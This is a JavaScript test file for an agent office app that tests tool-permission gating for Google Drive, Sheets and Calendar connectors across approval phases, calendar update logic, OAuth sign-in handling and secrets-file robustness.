  const keys = runKeys({ connectors, company, agent: desks.lead }); assert.deepEqual(keys, ['google-drive', 'google-sheets']);
  const denied = []; const gate = (phase, approved = '') => toolGate({ connectors, keys, own: [], phase, approved, builtin: ['WebSearch'], onDeny: (n, why) => denied.push(`${n}: ${why}`) });
  const sub = { agentID: 'a-numbers' }; // a call made inside the team member's sub-agent
  for (const phase of ['draft', 'wrap']) {
    assert.equal((await gate(phase)('mcp__google-drive__drive_share', {}, sub)).behavior, 'deny', phase);
    assert.equal((await gate(phase)('mcp__google-sheets__sheets_write', {}, sub)).behavior, 'deny', phase);
    assert.equal((await gate(phase)('mcp__google-drive__drive_search', {}, sub)).behavior, 'allow', phase);
    assert.equal((await gate(phase)('mcp__google-drive__drive_search', {})).behavior, 'deny', `${phase}: the lead itself does not reach its team's servers`);
  }
  // after the OK, only what the approved steps call, reads included
  assert.equal((await gate('execute', 'Done.\nAFTER YOUR OK\n1. mcp__google-sheets__sheets_write the totals into B2')('mcp__google-sheets__sheets_write', {}, sub)).behavior, 'allow');
  assert.equal((await gate('execute', 'AFTER YOUR OK\n1. sheets_write(B2, totals)')('mcp__google-drive__drive_share', {}, sub)).behavior, 'deny', 'not in the approved steps');
  assert.equal((await gate('execute', 'AFTER YOUR OK\n1. sheets_write(B2, totals)')('mcp__google-drive__drive_search', {}, sub)).behavior, 'deny', 'a read not in the steps does not run after the OK either');
  assert.equal((await gate('draft')('mcp__google-calendar__calendar_add', {}, sub)).behavior, 'deny', 'not on the desk or its team');
  assert.equal((await gate('draft')('WebSearch', {})).behavior, 'allow'); assert.equal((await gate('draft')('Bash', {})).behavior, 'deny');
  assert.match(denied[0], /drive_share: outbound in the draft phase/);
});

test('calendar: switching between all-day and timed clears the other kind; moves keep the length; dots are not ids', async () => {
  const events = {
    allday: { id: 'allday', summary: 'Training', start: { date: '2026-11-01' }, end: { date: '2026-11-04' } },
    timed: { id: 'timed', summary: 'Call', start: { dateTime: '2026-10-13T08:00:00Z' }, end: { dateTime: '2026-10-13T09:30:00Z' } },
  };
  const g = fakeGoogle([[/GET .*\/events\/(allday|timed)$/, ({ url }) => events[url.split('/').pop()]], [/PATCH .*\/events\//, ({ json }) => ({ id: 'x', summary: 'x', ...json })]]);
  const { call, close } = await client(g, ['calendar']);
  await call('calendar_update', { eventId: 'allday', start: '2026-11-08' });
  let c = g.calls.at(-1); assert.deepEqual([c.json.start, c.json.end], [{ date: '2026-11-08', dateTime: null, timeZone: null }, { date: '2026-11-11', dateTime: null, timeZone: null }], 'three days stay three days');
  await call('calendar_update', { eventId: 'allday', start: '2026-11-01T10:00' });
  c = g.calls.at(-1); assert.deepEqual(c.json.start, { dateTime: '2026-11-01T10:00:00.000Z', timeZone: 'Europe/London', date: null }); assert.equal(c.json.end.date, null);
  await call('calendar_update', { eventId: 'timed', allDay: true });
  c = g.calls.at(-1); assert.deepEqual([c.json.start, c.json.end], [{ date: '2026-10-13', dateTime: null, timeZone: null }, { date: '2026-10-14', dateTime: null, timeZone: null }]);
  assert.match((await call('calendar_update', { eventId: 'allday', allDay: false })).text, /Give a start time/);
  const n = g.calls.length;
  assert.equal((await call('calendar_update', { eventId: '.', summary: 'x' })).error, true); assert.equal((await call('calendar_update', { eventId: ' .. ' })).error, true);
  assert.equal(g.calls.length, n, 'a dot id never reaches Google');
  await close();
  const s = fakeGoogle([[/GET .*\/values\//, () => ({ range: 'A1:B10000', values: Array.from({ length: 10000 }, (_, i) => [i, 'x'.repeat(40)]) })]]);
  const sc = await client(s, ['sheets']);
  assert.equal((await sc.call('sheets_read', { spreadsheetId: 's', range: '..' })).error, true);
  const big = await sc.call('sheets_read', { spreadsheetId: 's', range: 'A1:B10000', maxRows: 10000 });
  assert.ok(big.text.length < 91000); assert.match(big.text, /cut here: the answer was too long/);
  await sc.close();
});

test('sign-in: a doubled callback exchanges the code once and still succeeds', async () => {
  const cfg = signinCfg(); let exchanges = 0;
  const fetchImpl = async () => { exchanges++; await new Promise(r => setTimeout(r, 30)); return json(200, { access_token: 'at', refresh_token: 'rt', scope: ALL, id_token: idToken('office@example.com') }); };
  let listen; const ready = new Promise(r => (listen = r));
  const p = connectGoogle({ cfg, clientId: 'cid', clientSecret: 'cs', port: 0, open: false, log: () => {}, fetchImpl, onListen: listen });
  const { redirect, state } = await ready;
  const [a, b] = await Promise.all([hit(`${redirect}?state=${state}&code=c`), hit(`${redirect}?state=${state}&code=c`)]);
  assert.equal(exchanges, 1); assert.ok([a.body, b.body].some(x => /connected to Google/.test(x))); assert.ok([a.body, b.body].some(x => /being finished in the other tab/.test(x)));
  assert.equal((await p).account, 'office@example.com');
});

// ---- hardening, part 2 ------------------------------------------------------------------------------------
test('hardening: a timed change with a bare date is refused, calendar ids with dots too; a half-saved secrets file keeps the old ones; a linked secrets file is written through', async () => {
  const g = fakeGoogle([[/GET .*\/events\/timed$/, () => ({ id: 'timed', summary: 'Call', start: { dateTime: '2026-10-13T08:00:00Z' }, end: { dateTime: '2026-10-13T09:00:00Z' } })], [/PATCH/, ({ json }) => ({ id: 'timed', ...json })]]);
  const { call, close } = await client(g, ['calendar']);
  const r = await call('calendar_update', { eventId: 'timed', start: '2026-11-01', allDay: false }); assert.equal(r.error, true); assert.match(r.text, /needs a start time/);
  assert.equal(g.calls.some(c => c.method === 'PATCH'), false, 'no empty change is sent');
  for (const calendarId of ['.', '..']) assert.equal((await call('calendar_events', { calendarId })).error, true);
  assert.equal(g.calls.filter(c => c.method !== 'GET' || !/events\/timed$/.test(c.url)).length, 0);
  await close();

  const d = tmp('keep-'); const f = path.join(d, '.secrets.local'); fs.writeFileSync(f, 'ANTHROPIC_API_KEY=key-that-must-stay\n');
  setSecretsCheckMs(0);
  try {
    loadSecrets(f);
    fs.writeFileSync(f, ''); const t1 = new Date(Date.now() + 5000); fs.utimesSync(f, t1, t1);
    assert.equal(secret('ANTHROPIC_API_KEY'), 'key-that-must-stay', 'an empty read does not wipe');
    fs.rmSync(f); assert.equal(secret('ANTHROPIC_API_KEY'), 'key-that-must-stay', 'a missing file does not wipe');
    fs.writeFileSync(f, 'ANTHROPIC_API_KEY=key-after-save\n'); const t2 = new Date(Date.now() + 9000); fs.utimesSync(f, t2, t2);
    assert.equal(secret('ANTHROPIC_API_KEY'), 'key-after-save');
  } finally { setSecretsCheckMs(2000); }

  const { writeSecret } = await import('../io/connect-meta.mjs');
  const real = path.join(d, 'real.secrets'); fs.writeFileSync(real, 'A=1\n'); const link = path.join(d, 'link.secrets');
  try { fs.symlinkSync(real, link); } catch { return; } // no symlinks here (Windows without the right): nothing to check
  writeSecret(link, 'B', '2');
  assert.ok(fs.lstatSync(link).isSymbolicLink(), 'the link stays a link'); assert.equal(fs.readFileSync(real, 'utf8'), 'A=1\nB=2\n');
});

test('sign-in page: the office\'s colours and a link back to the office; the sign-in server is shut before the result comes back', async () => {
  const cfg = { ...signinCfg(), host: '127.0.0.1', port: 4600 };
  let listen; const ready = new Promise(r => (listen = r));
  const p = connectGoogle({ cfg, clientId: 'cid', clientSecret: 'cs', port: 0, open: false, log: () => {}, fetchImpl: async () => json(200, { access_token: 'a', refresh_token: 'r', scope: ALL, id_token: idToken('office@example.com') }), onListen: listen });
  const { redirect, state } = await ready;
  const pg = await hit(`${redirect}?state=${state}&code=c`);
  assert.match(pg.body, /#0B0E14/); assert.match(pg.body, /href="http:\/\/127\.0\.0\.1:4600\/"[^>]*>Open Nightdesk/); assert.doesNotMatch(pg.body, /Georgia|#2b2017/);
  await p;
  const code = await new Promise(r => http.get(redirect, { agent: false }, res => { res.resume(); r('answered'); }).on('error', e => r(e.code)));
  assert.equal(code, 'ECONNREFUSED', 'nothing listens once it has finished');
});
